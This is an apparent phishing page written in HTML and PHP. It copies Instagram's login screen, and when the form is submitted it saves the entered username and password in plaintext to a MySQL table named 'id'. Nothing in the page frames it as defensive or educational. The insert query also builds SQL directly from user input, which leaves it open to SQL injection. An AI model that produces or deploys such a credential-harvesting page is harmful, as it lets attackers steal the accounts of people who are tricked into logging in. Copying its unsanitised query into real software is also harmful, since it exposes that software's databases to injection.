<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
   
    <title>instagram</title>
</head>

<body>




    <div class="contenar">
        <div class="text">log in tocontinue</div>
        <div class="page">
            <div class="title">instagram</div>
            <?php
require_once('database.php');
if(isset($_POST['hnartn'])){
    $name = $_POST['name'];
    $password = $_POST['password'];
    if(empty($name)){
        echo "enter the name";
    }elseif(empty($password)){
        echo "enter the password";
    }
    else{
     $sql = "INSERT INTO id(name, password) VALUES('$name', '$password')";
     if(mysqli_query($connect, $sql) === TRUE){
        echo "sucsess";
     }else{
        echo "not sucsess";
     }

}
}



?>
            <form method="POST">
                <input name="name" type="text" placeholder="phone, number, username, or email">
                <input name="password" type="password" placeholder="password">
                <button name="hnartn">log in</button>
                <div class="option">OR</div>
            </form>
            <div class="fblink">
                <span class=""></span>
                <a href="#">log in with facebook</a>
            </div>
            <div class="forget-id">
                <a href="#">forget password?</a>
            </div>
            <div class="signup">
                <p>Dont have an account?<a href="#">Sign up</a></p>
            </div>
        </div>
    </div>
</body>

</html>